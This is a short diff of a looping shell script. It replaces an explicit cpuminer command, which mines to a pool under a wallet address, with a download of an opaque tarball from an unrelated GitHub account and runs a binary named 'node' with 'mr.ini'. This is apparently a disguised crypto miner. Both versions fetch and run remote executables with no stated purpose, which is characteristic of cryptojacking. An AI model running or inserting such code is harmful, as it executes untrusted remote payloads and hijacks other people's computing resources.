@@ -3,8 +3,10 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk -p c=DGB,zap=PYRK-lyra2z330 -q
-
+     wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar
+     tar -xvf MXCC.tar
+     cd MXCC
+     ./node mr.ini
      echo COUNTER $COUNTER
      let COUNTER-=1
 done
